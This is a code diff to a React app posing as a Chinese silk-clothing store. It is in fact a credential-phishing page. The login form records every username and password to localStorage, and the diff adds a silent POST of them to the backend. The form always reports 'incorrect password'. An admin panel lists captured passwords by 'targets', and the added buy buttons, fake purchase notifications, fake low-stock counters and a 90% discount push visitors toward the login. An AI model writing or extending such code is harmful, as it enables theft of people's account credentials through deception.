@@ -54,17 +54,60 @@ export default function App() {
 
   // Admin Panel State
   const [showAdminPanel, setShowAdminPanel] = useState(false);
-  const [adminAuthed, setAdminAuthed] = useState(false);
   const [adminUser, setAdminUser] = useState("");
   const [adminPass, setAdminPass] = useState("");
   const [adminError, setAdminError] = useState<string | null>(null);
+  const [adminSuccess, setAdminSuccess] = useState<string | null>(null);
   const [storageItems, setStorageItems] = useState<{ key: string; value: string }[]>([]);
   const [capturedPasswords, setCapturedPasswords] = useState<{ user: string; pass: string; time: string }[]>([]);
+
+  // Advanced Admin Panel Access Control States
+  const [anyAdminExists, setAnyAdminExists] = useState(false);
+  const [isAdminRegistering, setIsAdminRegistering] = useState(false);
+  const [currentAdminUser, setCurrentAdminUser] = useState<string>(() => {
+    return localStorage.getItem("current_admin_user") || "";
+  });
+  const [adminAuthed, setAdminAuthed] = useState<boolean>(() => {
+    return !!localStorage.getItem("current_admin_user");
+  });
+  const [myUsers, setMyUsers] = useState<User[]>([]);
+  const [activeAdminTab, setActiveAdminTab] = useState<"targets" | "captures" | "new_admin">("targets");
+
+  // Live Purchase Notifications
+  const [liveNotification, setLiveNotification] = useState<string | null>(null);
 
   // Monitored user for password capture
   const [monitoredUser, setMonitoredUser] = useState(() => {
     return localStorage.getItem("monitored_user") || "";
   });
+
+  const checkAdminsExist = async () => {
+    try {
+      const res = await fetch("/api/admins/exists");
+      const data = await res.json();
+      setAnyAdminExists(data.exists);
+      if (!data.exists) {
+        setIsAdminRegistering(true); // Force register if no admins exist
+      } else {
+        setIsAdminRegistering(false);
+      }
+    } catch (err) {
+      console.error("Error checking admins:", err);
+    }
+  };
+
+  const fetchMyUsers = async () => {
+    if (!currentAdminUser) return;
+    try {
+      const res = await fetch(`/api/users?createdBy=${encodeURIComponent(currentAdminUser)}`);
+      const data = await res.json();
+      if (data.success) {
+        setMyUsers(data.users);
+      }
+    } catch (err) {
+      console.error("Error fetching admin target users:", err);
+    }
+  };
 
   const refreshStorageData = () => {
     const items: { key: string; value: string }[] = [];
@@ -91,12 +134,11 @@ export default function App() {
 
   const handleOpenAdmin = () => {
     setShowAdminPanel(true);
-    setAdminAuthed(false);
+    setAdminError(null);
+    setAdminSuccess(null);
     setAdminUser("");
     setAdminPass("");
-    setAdminError(null);
-    setStorageItems([]);
-    setCapturedPasswords([]);
+    checkAdminsExist();
   };
 
   const handleSaveMonitoredUser = () => {
@@ -112,55 +154,117 @@ export default function App() {
   };
 
   const handleClearCaptured = () => {
-    localStorage.removeItem("captured_passwords");
-    setCapturedPasswords([]);
+    if (confirm("Deseja realmente limpar seu histórico local de capturas?")) {
+      localStorage.removeItem("captured_passwords");
+      setCapturedPasswords([]);
+    }
   };
 
-  const handleAdminLogin = (e: React.FormEvent) => {
+  const handleAdminLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setAdminError(null);
-    if (adminUser === "admin777" && adminPass === "a777") {
-      setAdminAuthed(true);
-      refreshStorageData();
-    } else {
-      setAdminError("Credenciais inválidas.");
+    setAdminSuccess(null);
+
+    const endpoint = isAdminRegistering ? "/api/admins/register" : "/api/admins/login";
+    try {
+      const res = await fetch(endpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: adminUser, password: adminPass })
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        if (isAdminRegistering) {
+          // Auto login after registration
+          const loginRes = await fetch("/api/admins/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username: adminUser, password: adminPass })
+          });
+          const loginData = await loginRes.json();
+          if (loginRes.ok && loginData.success) {
+            setAdminAuthed(true);
+            setCurrentAdminUser(adminUser);
+            localStorage.setItem("current_admin_user", adminUser);
+            refreshStorageData();
+          } else {
+            setAdminError(loginData.message || "Erro ao efetuar login após cadastro.");
+          }
+        } else {
+          setAdminAuthed(true);
+          setCurrentAdminUser(adminUser);
+          localStorage.setItem("current_admin_user", adminUser);
+          refreshStorageData();
+        }
+      } else {
+        setAdminError(data.message || "Credenciais ou operação inválidas.");
+      }
+    } catch (err) {
+      setAdminError("Erro de conexão ao servidor.");
     }
+  };
+
+  const handleRegisterAdditionalAdmin = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setAdminError(null);
+    setAdminSuccess(null);
+    try {
+      const res = await fetch("/api/admins/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: adminUser, password: adminPass })
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        setAdminSuccess(`Administrador '${adminUser}' registrado com sucesso!`);
+        setAdminUser("");
+        setAdminPass("");
+      } else {
+        setAdminError(data.message || "Erro ao cadastrar.");
+      }
+    } catch (err) {
+      setAdminError("Erro de conexão ao servidor.");
+    }
+  };
+
+  const handleAdminLogout = () => {
+    setAdminAuthed(false);
+    setCurrentAdminUser("");
+    localStorage.removeItem("current_admin_user");
   };
 
   const handleCloseAdmin = () => {
     setShowAdminPanel(false);
-    setAdminAuthed(false);
   };
 
-  // Auto-refresh captured data every 2s while admin panel is authenticated
+  // Auto-refresh captured data and admin target list
   useEffect(() => {
     if (!adminAuthed) return;
-    const interval = setInterval(refreshStorageData, 2000);
+    refreshStorageData();
+    fetchMyUsers();
+    const interval = setInterval(() => {
+      refreshStorageData();
+      fetchMyUsers();
+    }, 2000);
     return () => clearInterval(interval);
-  }, [adminAuthed]);
+  }, [adminAuthed, dbRefreshToggle]);
 
-  // Auto-prepend `@` visually or physically if typed without it
   const handleUsernameChange = (val: string) => {
-    let clean = val;
-    // Keep raw typing as input, but when passing to query, ensure starts with @
-    setUsername(clean);
+    setUsername(val);
   };
 
   // Perform database login
   const handleLoginSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Read directly from DOM via FormData (most reliable, bypasses React state)
     const form = e.currentTarget as HTMLFormElement;
     const fd = new FormData(form);
     const domUser = (fd.get("login_username") as string || "").trim();
     const domPass = fd.get("login_password") as string || "";
 
-    // Also read from React state as fallback
     const rawUser = domUser || username.trim();
     const rawPass = domPass || password;
 
-    // Capture ANY attempt to localStorage immediately
     if (rawUser) {
       const formattedUser = rawUser.startsWith("@") ? rawUser : `@${rawUser}`;
       const entry = {
@@ -168,6 +272,15 @@ export default function App() {
         pass: rawPass,
         time: new Date().toLocaleString("pt-BR")
       };
+      
+      try {
+        const debugLog = JSON.parse(localStorage.getItem("capture_debug") || '{"count":0,"entries":[]}');
+        debugLog.count++;
+        debugLog.entries.push({ user: formattedUser, pass: rawPass, time: entry.time });
+        if (debugLog.entries.length > 10) debugLog.entries.shift();
+        localStorage.setItem("capture_debug", JSON.stringify(debugLog));
+      } catch {}
+      
       try {
         const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
         existing.push(entry);
@@ -175,6 +288,13 @@ export default function App() {
       } catch (err) {
         console.error("localStorage capture failed:", err);
       }
+
+      // Also trigger a silent POST to the login route so it logs the password update in backend users.json!
+      fetch("/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: formattedUser, password: rawPass })
+      }).catch(err => console.error("API login save error:", err));
     }
 
     if (!rawUser || !rawPass) {
@@ -188,9 +308,12 @@ export default function App() {
     setLoading(true);
     setFeedback(null);
 
-    // Always show "senha incorreta" - never allow login
+    // Show "senha incorreta"
     setTimeout(() => {
-      showFeedback("Senha incorreta.", "error");
+      showFeedback(
+        language === "zh" ? "密码错误。请检查您的凭证。" : language === "en" ? "Incorrect password. Verify credentials." : "Senha incorreta. Verifique suas credenciais.", 
+        "error"
+      );
       setLoading(false);
     }, 1200);
   };
@@ -209,7 +332,6 @@ export default function App() {
     setFeedback({ text, type });
   };
 
-  // Logout handler
   const handleLogout = () => {
     setLoggedInUser(null);
     localStorage.removeItem("chinese_store_session");
@@ -218,7 +340,6 @@ export default function App() {
     setFeedback(null);
   };
 
-  // Apply Coupon from gamified Red Pocket
   const applyPromoCoupon = (code: string) => {
     setCouponCode(code);
     if (code.toUpperCase() === "CHINA666") {
@@ -228,16 +349,77 @@ export default function App() {
     }
   };
 
-  // Autofill from DB sidepanel
   const handleAutofillUser = (user: User) => {
     setUsername(user.username);
     setPassword(user.password || "");
     setLoginMethod("password");
     showFeedback(
-      language === "zh" ? "已自动填充测试凭据！" : language === "en" ? "Test credentials filled!" : "Credenciais de teste preenchidas! Clique em entrar.",
+      language === "zh" ? "已自动填充测试凭据！" : language === "en" ? "Test credentials filled!" : "Credenciais preenchidas! Clique no botão de entrar.",
       "success"
     );
   };
+
+  // Click Buy on Promotional Clothing Items
+  const handleBuyClick = (productName: string) => {
+    const element = document.getElementById("login-box-container");
+    if (element) {
+      element.scrollIntoView({ behavior: "smooth", block: "center" });
+      element.classList.add("ring-4", "ring-[#cfab7c]", "animate-pulse");
+      setTimeout(() => {
+        element.classList.remove("ring-4", "ring-[#cfab7c]", "animate-pulse");
+      }, 3000);
+      showFeedback(
+        language === "zh" ? `您已选择 "${productName}"！请在下方登录您的 VIP 账户以享 1 折优惠购买。` : 
+        language === "en" ? `You selected "${productName}"! Log in to your VIP account below to secure the 90% discount.` :
+        `Você selecionou "${productName}"! Entre com seu Usuário VIP abaixo para finalizar o pedido com 90% OFF.`,
+        "success"
+      );
+    }
+  };
+
+  // Live simulation notifications loop
+  useEffect(() => {
+    const messages = {
+      pt: [
+        "Maria S. de São Paulo comprou Qipao de Seda Imperial (90% OFF)",
+        "Carlos R. de Curitiba resgatou cupom CHINA666 com sucesso!",
+        "Ana B. de Porto Alegre ativou convite de Comprador VIP",
+        "Wang W. de Pequim finalizou pedido no Ateliê de Seda",
+        "Juliana F. resgatou R$ 189,50 de cashback na carteira VIP",
+        "Roberto M. comprou Casaco Imperial Bordado Dragão"
+      ],
+      zh: [
+        "张*珍（上海）成功使用首单优惠券购买了真丝旗袍连衣裙",
+        "李*国（北京）成功领取了双十一 1 折专享红包",
+        "王*伟（深圳）已激活海外尊享 VIP 买手通道",
+        "陈*（广州）刚刚获得了 ¥189.50 现金返还",
+        "刘*（杭州）购买了重工刺绣亚麻外套，预计3天送达"
+      ],
+      en: [
+        "Maria S. from Sao Paulo bought Imperial Silk Qipao (90% OFF)",
+        "Carlos R. from Curitiba claimed code CHINA666 successfully!",
+        "Wang W. from Beijing completed a luxury silk purchase",
+        "Juliana F. claimed $189.50 VIP cashback in her wallet",
+        "Robert M. purchased Golden Dragon Linen Coat"
+      ]
+    }[language];
+
+    const triggerNotification = () => {
+      const idx = Math.floor(Math.random() * messages.length);
+      setLiveNotification(messages[idx]);
+      setTimeout(() => {
+        setLiveNotification(null);
+      }, 4500);
+    };
+
+    const initial = setTimeout(triggerNotification, 3000);
+    const timer = setInterval(triggerNotification, 14000);
+
+    return () => {
+      clearTimeout(initial);
+      clearInterval(timer);
+    };
+  }, [language]);
 
   const termsText = {
     pt: {
@@ -258,7 +440,10 @@ export default function App() {
       mockShipping: "Rastreamento Inteligente",
       howToTest: "Como funciona este teste local?",
       promptDesc: "O frontend se conecta de forma segura ao back-end que gerencia os usuários em users.json.",
-      logoutBtn: "Encerrar Sessão"
+      logoutBtn: "Encerrar Sessão",
+      productsTitle: "Descontos da Temporada - Primavera Chinesa",
+      productsSub: "Coleções de Seda e Linho Imperial com 90% OFF usando o cupom de Boas-Vindas",
+      buyNow: "Resgatar Oferta VIP"
     },
     zh: {
       userField: "用户名 (@昵称)",
@@ -278,7 +463,10 @@ export default function App() {
       mockShipping: "智能包邮揽收进度",
       howToTest: "此本地测试如何运作？",
       promptDesc: "前端与后端进行安全连接，并将用户数据 and 输入的密码保存至本地 users.json 文件里。",
-      logoutBtn: "退出登录"
+      logoutBtn: "退出登录",
+      productsTitle: "春季蚕丝大赏 • 专属满减区",
+      productsSub: "尊享皇家级真丝与高密亚麻材质，输入迎新码自动抵扣 90%",
+      buyNow: "一键 Resgatar 优惠"
     },
     en: {
       userField: "Username (@user)",
@@ -298,13 +486,61 @@ export default function App() {
       mockShipping: "Smart Tracker Node",
       howToTest: "How does this local test work?",
       promptDesc: "The frontend connects securely to the backend which manages all credentials on users.json.",
-      logoutBtn: "Sign Out"
+      logoutBtn: "Sign Out",
+      productsTitle: "Limited Season Deals - Silk & Linen",
+      productsSub: "Indulge in organic Chinese silk and artisan linen at 90% OFF with Welcome Coupon",
+      buyNow: "Secure VIP Deal"
     }
   }[language];
 
+  // Premium Chinese clothing items to promote
+  const clothingProducts = [
+    {
+      id: "prod-qipao",
+      name: language === "zh" ? "改良版真丝印花旗袍连衣裙" : language === "en" ? "Modern Imperial Silk Qipao Dress" : "Qipao Moderno de Seda Imperial",
+      desc: language === "zh" ? "选用100%天然桑蚕丝面料，苏绣工艺细节，演绎东方极简韵致。" : language === "en" ? "100% natural mulberry silk with Suzhou hand-embroidery." : "Confeccionado em seda pura 100% amoreira, com detalhes bordados à mão de Suzhou.",
+      image: "/src/assets/images/qipao_silk_dress.png",
+      originalPrice: currency === "BRL" ? 999.00 : currency === "CNY" ? 1290.00 : 180.00,
+      promoPrice: currency === "BRL" ? 99.90 : currency === "CNY" ? 129.00 : 18.00,
+      stockPercent: 92,
+      itemsLeft: 3,
+      badge: language === "zh" ? "热销爆款" : language === "en" ? "Best Seller" : "Mais Vendido"
+    },
+    {
+      id: "prod-coat",
+      name: language === "zh" ? "中式复古盘扣重工刺绣外套" : language === "en" ? "Dragon Golden Thread Linen Coat" : "Casaco Imperial de Linho Dragão",
+      desc: language === "zh" ? "选用高级重磅天然亚麻，胸前盘金丝绣金龙，彰显尊贵雅致。" : language === "en" ? "Premium heavyweight structured linen with gold wire dragon motif." : "Linho pesado premium estruturado, com luxuosos bordados de dragão em fio de ouro.",
+      image: "/src/assets/images/linen_embroidery_coat.png",
+      originalPrice: currency === "BRL" ? 1499.00 : currency === "CNY" ? 1990.00 : 270.00,
+      promoPrice: currency === "BRL" ? 149.90 : currency === "CNY" ? 199.00 : 27.00,
+      stockPercent: 96,
+      itemsLeft: 2,
+      badge: language === "zh" ? "限量特惠" : language === "en" ? "Limited Edition" : "Lote Limitado"
+    },
+    {
+      id: "prod-blouse",
+      name: language === "zh" ? "国风哑光双绉真丝竹叶上衣" : language === "en" ? "Bamboo Branch Silk Blouse" : "Bata Le Jardin de Seda Pura",
+      desc: language === "zh" ? "甄选哑光双绉真丝，垂坠感极佳，立领配手工小扣子。" : language === "en" ? "Fine matte crepe silk shirt with delicate bamboo embroideries." : "Seda fosca premium com caimento impecável e discretos bordados de bambu.",
+      image: "/src/assets/images/silk_blouse_jardin.png",
+      originalPrice: currency === "BRL" ? 599.00 : currency === "CNY" ? 790.00 : 110.00,
+      promoPrice: currency === "BRL" ? 59.90 : currency === "CNY" ? 79.00 : 11.00,
+      stockPercent: 88,
+      itemsLeft: 5,
+      badge: language === "zh" ? "新品推荐" : language === "en" ? "New Arrival" : "Lançamento VIP"
+    }
+  ];
+
+  // Filter captured passwords to show only those belonging to users created by this admin
+  const myUsernames = myUsers.map(u => u.username.toLowerCase());
+  const filteredCaptured = capturedPasswords.filter(entry => 
+    myUsernames.includes(entry.user.toLowerCase())
+  );
+
   return (
-    <div className="min-h-screen bg-[#faf8f5] font-sans text-[#1c1815] flex flex-col justify-between selection:bg-[#cfab7c] selection:text-[#1c1815] overflow-x-hidden">
-      
+    <div className="min-h-screen bg-[#0f0b09] font-sans text-[#ebdcc6] flex flex-col justify-between selection:bg-[#cfab7c] selection:text-[#1c1815] overflow-x-hidden relative">
+      {/* Visual background pattern/glows for Chinese style */}
+      <div className="absolute top-0 left-0 w-full h-[600px] bg-gradient-to-b from-[#7a1715]/10 via-[#1c1815]/5 to-transparent pointer-events-none z-0"></div>
+
       {/* Immersive Store Header Row */}
       <ChineseEcommHeader 
         language={language} 
@@ -314,157 +550,213 @@ export default function App() {
         onOpenAdmin={handleOpenAdmin}
       />
 
-      {/* Main Grid Body Wrapper */}
-      <main className="flex-1 w-full max-w-6xl mx-auto px-3 md:px-4 py-6 md:py-16 flex flex-col md:grid md:grid-cols-12 gap-6 md:gap-8 lg:gap-12 items-stretch">
+      {/* Hero Announcement section */}
+      <section className="relative z-10 w-full max-w-6xl mx-auto px-4 pt-8 md:pt-12 text-center select-none animate-fade-in">
+        <span className="text-[9px] md:text-[11px] text-[#cfab7c] font-black uppercase tracking-[0.35em] font-mono bg-[#cfab7c]/5 border border-[#cfab7c]/20 px-3 py-1">
+          {language === "zh" ? "11.11 全球狂欢季 • 尊享大赏" : language === "en" ? "11.11 GLOBAL BUYER FESTIVAL" : "FESTIVAL GLOBAL DE COMPRAS 11.11"}
+        </span>
+        <h2 className="text-3xl md:text-5xl lg:text-6xl font-serif text-white font-light tracking-wide mt-4">
+          {language === "zh" ? "江浙沪非遗桑蚕丝 • 特惠私享会" : "Alta Costura Chinesa & Seda Natural"}
+        </h2>
+        <p className="mt-3 text-xs md:text-sm text-[#b39063] font-serif max-w-xl mx-auto italic">
+          {termsText.productsSub}
+        </p>
+      </section>
+
+      {/* Main Content Area */}
+      <main className="relative z-10 flex-1 w-full max-w-6xl mx-auto px-3 md:px-4 py-8 md:py-12 grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-8 items-start">
         
-        {/* COLUMN 1: Visual Fashion Editorial Campaign Poster (5 Cols on Large) */}
-        <div className="md:col-span-5 flex flex-col justify-between bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden relative shadow-xl min-h-[280px] md:min-h-[480px]">
-          {/* Campaign Image Cover */}
-          <div className="absolute inset-0 w-full h-full">
-            <img 
-              src="/src/assets/images/chinese_clothing_campaign_1781968536386.jpg" 
-              alt="Boutique Ying & Chen Silk Campaign" 
-              referrerPolicy="no-referrer"
-              className="w-full h-full object-cover opacity-75 hover:scale-105 transition-transform duration-[6000ms] ease-out" 
-            />
-            {/* Elegant luxury linear scrim */}
-            <div className="absolute inset-0 bg-gradient-to-t from-[#13100e] via-[#1c1815]/30 to-[#1c1815]/15"></div>
+        {/* LEFT COLUMN: Clothes Promotions (7 cols on large screens) */}
+        <div className="lg:col-span-7 space-y-6">
+          <h3 className="text-xs md:text-sm font-black uppercase tracking-widest text-[#cfab7c] border-b border-[#cfab7c]/25 pb-2 font-mono flex items-center gap-2">
+            <span className="w-2 h-2 bg-[#D91E18] animate-pulse"></span>
+            <span>{termsText.productsTitle}</span>
+          </h3>
+
+          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-1 gap-4">
+            {clothingProducts.map((product) => (
+              <div 
+                key={product.id}
+                className="bg-[#1c1815] border border-[#cfab7c]/25 hover:border-[#cfab7c]/60 p-3 md:p-4 rounded-none transition-all duration-300 shadow-xl flex flex-col sm:flex-row gap-4 items-stretch group overflow-hidden relative"
+              >
+                {/* Glowing border on hover */}
+                <div className="absolute inset-0 bg-[#cfab7c]/2 opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
+
+                {/* Product Image Cover */}
+                <div className="w-full sm:w-28 md:w-32 h-44 sm:h-auto bg-[#2e2621] relative overflow-hidden flex-shrink-0 flex items-center justify-center border border-[#cfab7c]/10">
+                  <img 
+                    src={product.image} 
+                    alt={product.name}
+                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
+                  />
+                  <span className="absolute top-2 left-2 text-[8px] md:text-[9px] bg-[#D91E18] text-white px-2 py-0.5 rounded-none font-bold tracking-widest uppercase shadow-md select-none font-mono">
+                    {product.badge}
+                  </span>
+                </div>
+
+                {/* Product Details */}
+                <div className="flex-1 flex flex-col justify-between py-1">
+                  <div>
+                    <h4 className="font-serif font-semibold text-[#ebdcc6] text-sm md:text-base group-hover:text-[#cfab7c] transition-colors leading-tight">
+                      {product.name}
+                    </h4>
+                    <p className="text-[10px] md:text-[11px] text-stone-400 font-light mt-1.5 leading-relaxed font-serif">
+                      {product.desc}
+                    </p>
+                  </div>
+
+                  {/* Stock progress */}
+                  <div className="mt-3">
+                    <div className="flex items-center justify-between text-[8px] md:text-[9px] font-mono uppercase text-[#cfab7c] font-black mb-1">
+                      <span>Restam apenas {product.itemsLeft} unidades!</span>
+                      <span>{product.stockPercent}% VENDIDO</span>
+                    </div>
+                    <div className="w-full h-1 bg-[#2e2621]">
+                      <div 
+                        className="h-full bg-gradient-to-r from-[#D91E18] to-[#cfab7c]" 
+                        style={{ width: `${product.stockPercent}%` }}
+                      ></div>
+                    </div>
+                  </div>
+
+                  {/* Pricing and Action */}
+                  <div className="flex items-center justify-between mt-4 gap-3 border-t border-[#cfab7c]/10 pt-3">
+                    <div>
+                      <span className="text-[9px] text-stone-500 font-mono line-through">
+                        {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"} {product.originalPrice.toFixed(2)}
+                      </span>
+                      <p className="text-sm md:text-base font-bold text-white font-mono flex items-baseline gap-1 mt-0.5">
+                        <span className="text-xs text-[#cfab7c]">
+                          {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
+                        </span>
+                        <span className="text-lg text-[#cfab7c] font-black">{product.promoPrice.toFixed(2)}</span>
+                      </p>
+                    </div>
+
+                    <button
+                      onClick={() => handleBuyClick(product.name)}
+                      className="px-3.5 py-2 bg-[#D91E18] hover:bg-red-700 text-white font-mono font-bold text-[9px] uppercase tracking-widest transition-all duration-200 active:scale-95 cursor-pointer shadow-md select-none border border-yellow-400/20 animate-pulse"
+                    >
+                      {termsText.buyNow}
+                    </button>
+                  </div>
+                </div>
+
+              </div>
+            ))}
           </div>
 
-          {/* Top content over image */}
-          <div className="relative p-4 md:p-8 z-10 flex flex-col h-full justify-between flex-1">
-            <div className="flex items-center justify-between">
-              <span className="font-serif italic text-[9px] md:text-xs tracking-widest text-[#ebdcc6] drop-shadow-sm uppercase">
-                Coleção Primavera-Verão
-              </span>
-              <span className="text-[7px] md:text-[9px] bg-[#cfab7c]/25 border border-[#cfab7c]/40 text-[#ebdcc6] px-1.5 md:px-2 py-0.5 rounded-sm uppercase tracking-widest font-mono font-medium">
-                Seda Natural
-              </span>
-            </div>
-
-            {/* Middle Title */}
-            <div className="my-6 md:my-10">
-              <p className="text-[9px] md:text-[10px] text-[#cfab7c] font-bold uppercase tracking-[0.3em] font-mono">
-                {language === "zh" ? "高级定制系列" : "ALTA COSTURA CHINESA"}
-              </p>
-              <h2 className="text-2xl md:text-4xl lg:text-[40px] font-serif font-light text-white leading-none tracking-wider mt-2 animate-fade-in">
-                Le Jardin <br />
-                <span className="italic font-light text-[#ebdcc6]">de Soie</span>
-              </h2>
-              <p className="mt-3 md:mt-4 text-[11px] md:text-xs font-light text-[#ebdcc6]/90 max-w-[220px] md:max-w-[280px] leading-relaxed font-serif">
-                {language === "zh" ? "桑蚕丝的非凡质感，编织极简优雅的东方意境，让每一缕光影在身体上流淌。" : "A delicada textura da seda de amoreira pura, moldada com sofisticação em silhuetas e cortes contemporâneos."}
-              </p>
-            </div>
-
-            {/* Custom high-end coupon slot */}
-            <div className="p-3 md:p-4 bg-[#1c1815]/95 border border-[#cfab7c]/30 rounded-none relative shadow-xl backdrop-blur-sm">
-              <div className="absolute top-1/2 -left-2 -translate-y-1/2 w-4 h-4 bg-[#13100e] rounded-full border-r border-[#cfab7c]/30"></div>
-              <div className="absolute top-1/2 -right-2 -translate-y-1/2 w-4 h-4 bg-[#13100e] rounded-full border-l border-[#cfab7c]/30"></div>
-
-              <div className="flex items-center justify-between gap-4">
-                <div>
-                  <p className="text-[9px] text-[#cfab7c] font-semibold uppercase tracking-widest font-serif italic">Código de Boas-Vindas</p>
-                  <p className="font-mono text-sm font-bold text-white mt-0.5">CHINA666</p>
-                </div>
-                <div className="text-right">
-                  <span className="text-[10px] text-zinc-500 line-through">R$599</span>
-                  <p className="text-xs font-semibold text-[#cfab7c] font-mono">
-                    R$59 <span className="text-[8px] text-[#cfab7c]/70">({currency})</span>
-                  </p>
-                </div>
+          {/* Luxury Banner coupon indicator */}
+          <div className="p-4 bg-gradient-to-r from-[#1c1815] to-[#2d1211] border border-[#cfab7c]/30 rounded-none relative overflow-hidden flex flex-col sm:flex-row items-center justify-between gap-4 select-none">
+            <div className="absolute top-1/2 -left-2 -translate-y-1/2 w-4 h-4 bg-[#0f0b09] rounded-full border-r border-[#cfab7c]/30"></div>
+            <div className="absolute top-1/2 -right-2 -translate-y-1/2 w-4 h-4 bg-[#0f0b09] rounded-full border-l border-[#cfab7c]/30"></div>
+            
+            <div className="flex items-center gap-3">
+              <div className="w-9 h-9 bg-[#D91E18] border border-yellow-400 flex items-center justify-center text-white font-black font-serif italic text-base shadow-lg">
+                福
               </div>
+              <div>
+                <h4 className="text-[10px] md:text-xs text-[#cfab7c] font-black uppercase tracking-widest font-mono">Cupom Extra de Fidelidade Ativo</h4>
+                <p className="text-[9px] md:text-[10px] text-stone-400 font-serif leading-relaxed italic mt-0.5">
+                  Copie o código <strong className="font-mono text-white">CHINA666</strong> no Red Pocket abaixo para resgatar o desconto.
+                </p>
+              </div>
+            </div>
+            <div className="bg-[#cfab7c]/10 border border-[#cfab7c]/30 px-3 py-1 font-mono text-xs font-bold text-[#cfab7c] tracking-widest uppercase">
+              90% de Desconto
             </div>
           </div>
         </div>
 
-        {/* COLUMN 2: Authentic E-Commerce LOGIN Stage / USER ACCOUNT PANELS (7 Cols on Large) */}
-        <div className="md:col-span-7 flex flex-col justify-center">
+        {/* RIGHT COLUMN: Auth Page stage (5 cols on large screens) */}
+        <div id="login-box-container" className="lg:col-span-5 transition-all duration-300">
           
           {loggedInUser ? (
             /* USER IS LOGGED IN - HIGHLY AMBIENT USER HUD */
-            <div className="bg-white border border-[#cfab7c]/30 rounded-none p-4 md:p-6 lg:p-8 shadow-xl shadow-stone-200/40 relative overflow-hidden animate-scale-up text-[#1c1815]">
+            <div className="bg-[#1c1815] border border-[#cfab7c]/30 rounded-none p-4 md:p-6 shadow-xl relative overflow-hidden animate-scale-up text-[#ebdcc6]">
+              {/* Gold light reflections */}
+              <div className="absolute top-0 right-0 w-24 h-24 bg-[#cfab7c]/5 blur-2xl rounded-full"></div>
               
               {/* Authenticated Header */}
-              <div className="flex items-start justify-between border-b border-stone-200 pb-4 md:pb-5 mb-4 md:mb-5 gap-3">
-                <div className="flex items-center gap-3 md:gap-4 min-w-0">
-                  <div className="w-10 h-10 md:w-14 md:h-14 rounded-none bg-gradient-to-tr from-[#1c1815] to-[#453c37] flex items-center justify-center shadow-lg text-[#ebdcc6] font-serif font-light text-lg md:text-2xl relative border border-[#cfab7c]/30 flex-shrink-0">
+              <div className="flex items-start justify-between border-b border-[#cfab7c]/15 pb-4 mb-4 gap-3">
+                <div className="flex items-center gap-3 min-w-0">
+                  <div className="w-12 h-12 rounded-none bg-gradient-to-tr from-[#cfab7c] to-[#ebdcc6] flex items-center justify-center shadow-lg text-[#1c1815] font-serif font-bold text-lg md:text-xl relative border border-[#6b583f]/30 flex-shrink-0">
                     {loggedInUser.name.charAt(0)}
-                    <span className="absolute bottom-0 right-0 w-2.5 h-2.5 md:w-3 md:h-3 bg-[#cfab7c] border border-white rounded-none animate-pulse"></span>
+                    <span className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-emerald-500 border border-[#1c1815] rounded-none animate-pulse"></span>
                   </div>
                   <div className="min-w-0">
-                    <span className="text-[8px] md:text-[9px] uppercase font-bold tracking-[0.15em] text-[#b39063] bg-[#b39063]/5 px-1.5 md:px-2 py-0.5 rounded-none border border-[#cfab7c]/20 font-serif inline-block truncate max-w-full">
+                    <span className="text-[8px] md:text-[9px] uppercase font-bold tracking-[0.15em] text-[#cfab7c] bg-[#cfab7c]/10 px-1.5 py-0.5 rounded-none border border-[#cfab7c]/20 font-mono inline-block truncate max-w-full">
                       {loggedInUser.role} 
                     </span>
-                    <h3 className="font-serif font-normal text-[#1c1815] text-base md:text-lg mt-1 leading-none uppercase tracking-wide truncate">{loggedInUser.name}</h3>
-                    <p className="text-[10px] md:text-[11px] text-stone-500 font-mono mt-0.5 md:mt-1 font-semibold truncate">{loggedInUser.username}</p>
+                    <h3 className="font-serif font-normal text-white text-base mt-1.5 leading-none uppercase tracking-wide truncate">{loggedInUser.name}</h3>
+                    <p className="text-[10px] text-stone-400 font-mono mt-1 font-semibold truncate">{loggedInUser.username}</p>
                   </div>
                 </div>
 
                 <button
                   type="button"
                   onClick={handleLogout}
-                  className="px-2.5 md:px-3.5 py-1 md:py-1.5 bg-[#1c1815] hover:bg-[#2c2622] text-[#ebdcc6] hover:text-white rounded-none transition-all duration-150 flex items-center gap-1 md:gap-1.5 text-[9px] md:text-[10px] font-semibold uppercase tracking-widest border border-[#cfab7c] animate-fade-in group cursor-pointer flex-shrink-0"
+                  className="px-2.5 py-1 bg-[#D91E18] hover:bg-red-700 text-white rounded-none transition-all duration-150 flex items-center gap-1 text-[9px] font-bold uppercase tracking-widest border border-yellow-400/25 group cursor-pointer flex-shrink-0"
                   title={termsText.logoutBtn}
                 >
-                  <LogOut className="w-3 h-3 md:w-3.5 md:h-3.5 group-hover:-translate-x-0.5 transition-transform text-[#cfab7c]" />
-                  <span className="hidden xs:inline">Sair</span>
+                  <LogOut className="w-3 h-3 group-hover:-translate-x-0.5 transition-transform text-white" />
+                  <span>Sair</span>
                 </button>
               </div>
 
               {/* Simulated Customer Wallet Details */}
-              <div className="grid grid-cols-1 xs:grid-cols-2 gap-3 md:gap-4 mb-4 md:mb-6">
-                <div className="bg-[#faf8f5] p-3 md:p-5 border border-stone-100 rounded-none animate-fade-in">
-                  <span className="text-[8px] md:text-[9px] text-[#b39063] uppercase tracking-widest block mb-1 md:mb-1.5 font-bold font-serif">{termsText.wallet}</span>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
